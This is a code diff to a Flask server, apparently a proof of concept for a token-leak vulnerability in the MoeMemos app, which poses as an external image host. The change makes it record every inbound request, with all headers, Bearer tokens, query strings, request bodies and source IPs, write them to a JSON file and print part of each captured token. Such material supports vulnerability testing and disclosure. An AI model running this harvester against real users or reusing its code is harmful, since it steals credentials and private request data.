@@ -6,8 +6,8 @@ This Flask service acts as a malicious image server that captures Bearer tokens
 sent by the vulnerable MoeMemos app when it loads external images.
 
 Endpoints:
-    GET /malicious.png - Serves a fake image and logs Authorization header
-    GET /captured_tokens - Returns list of captured tokens
+    GET /malicious.png - Serves a fake image and logs the inbound request
+    GET /captured_tokens - Returns list of captured request records
     GET /health - Health check endpoint
 """
 
@@ -22,9 +22,10 @@ from werkzeug.serving import make_server
 
 app = Flask(__name__)
 
-# Storage for captured tokens
+# Storage for captured request records
 captured_tokens = []
 TOKENS_FILE = Path("/tmp/captured_tokens.json")
+MANAGEMENT_PATHS = {"/health", "/captured_tokens", "/clear_tokens"}
 
 
 def load_captured_tokens():
@@ -54,35 +55,52 @@ def health():
     return jsonify({"status": "healthy"}), 200
 
 
-@app.route("/malicious.png", methods=["GET"])
-def malicious_image():
-    """
-    Serve a fake image and capture any Authorization header sent.
+@app.before_request
+def capture_request():
+    """Record every app-facing inbound request, including non-Bearer traffic."""
+    if request.path in MANAGEMENT_PATHS:
+        return None
 
-    This endpoint mimics an external image server (like S3) that receives
-    the victim's Bearer token due to the vulnerability.
-    """
     auth_header = request.headers.get("Authorization", None)
+    body = request.get_data(cache=True) or b""
 
     capture_data = {
         "timestamp": datetime.utcnow().isoformat(),
+        "method": request.method,
+        "path": request.path,
+        "query_string": request.query_string.decode("utf-8", errors="replace"),
+        "query": {key: request.args.getlist(key) for key in request.args},
+        "headers": dict(request.headers.items()),
         "authorization_header": auth_header,
         "user_agent": request.headers.get("User-Agent", ""),
         "source_ip": request.remote_addr,
         "full_url": request.url,
+        "body": body[:2048].decode("utf-8", errors="replace"),
+        "body_truncated": len(body) > 2048,
     }
 
-    print("[TOKEN CAPTURE] Received request for malicious.png")
+    print(f"[TOKEN CAPTURE] Received {request.method} request for {request.path}")
     print(f"[TOKEN CAPTURE] Authorization: {auth_header}")
+
+    captured_tokens.append(capture_data)
+    save_captured_tokens()
 
     if auth_header and auth_header.startswith("Bearer "):
         token = auth_header.replace("Bearer ", "").strip()
         print(f"[TOKEN CAPTURE] ✓ CAPTURED TOKEN: {token[:20]}...")
-
-        captured_tokens.append(capture_data)
-        save_captured_tokens()
     else:
         print("[TOKEN CAPTURE] ✗ No Bearer token in Authorization header")
+    return None
+
+
+@app.route("/malicious.png", methods=["GET"])
+def malicious_image():
+    """
+    Serve a fake image after capture_request records the inbound request.
+
+    This endpoint mimics an external image server (like S3) that receives
+    the victim's Bearer token due to the vulnerability.
+    """
 
     # Return a 1x1 transparent PNG
     # This is a minimal valid PNG file
